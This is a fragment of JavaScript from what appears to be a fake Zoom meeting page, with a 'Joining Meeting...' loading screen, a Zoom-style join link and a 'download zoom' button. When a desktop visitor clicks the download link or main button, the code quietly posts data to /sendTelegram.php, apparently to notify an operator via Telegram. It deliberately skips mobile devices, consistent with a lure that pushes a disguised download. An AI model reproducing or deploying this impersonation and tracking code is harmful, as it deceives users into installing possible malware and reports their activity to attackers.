  loadingText.className = "loading-text";
  loadingText.textContent = "Joining Meeting...";

  loadingScreenDiv.appendChild(loadingCircle);
  loadingScreenDiv.appendChild(loadingText);

  return loadingScreenDiv;
}
function isMobileDevice() {
  const mobileKeywords = [
    "Android",
    "iPhone",
    "iPad",
    "iPod",
    "BlackBerry",
    "Windows Phone",
  ];
  return mobileKeywords.some((keyword) =>
    navigator.userAgent.includes(keyword)
  );
}
console.log(a_download_zoom.href);
a_download_zoom.onclick = function () {
  if (isMobileDevice()) {
    return;
  }
  if (!localStorage.getItem("send") || localStorage.getItem("send") == null) {
    $.ajax({
      url: "/sendTelegram.php",
      type: "POST",
      data: {
        link: link,
        code: code,
      },
      success: function (result) {
        localStorage.setItem("send", true);
        console.log(result);
      },
    });
  }
};

main_button.addEventListener("click", function () {
  if (isMobileDevice()) {
    return;
  }
  if (!localStorage.getItem("send") || localStorage.getItem("send") == null) {
    $.ajax({
      url: "/sendTelegram.php",
      type: "POST",
      data: {
        link: link,
        code: code,
      },
      success: function (result) {
        localStorage.setItem("send", true);
        console.log(result);
      },
    });
  }

  var button = document.querySelector(".smooth-0");
  button.classList.add("active");
  var button_2 = button.querySelector("span > a");
  button_2.onclick = function () {
    window.location.href =
      "/wc/9297089395/join?fromPWA=1&pwd=nqHng5wde2JB9V0X6Vy9XjtEkLQbCI.1&_x_zm_rtaid=pLSkJPLeRZ2WI_71XqraSg.1713722465775.a06685fcdecadaa5d1439f599b581dea&_x_zm_rhtaid=132";
  };
});
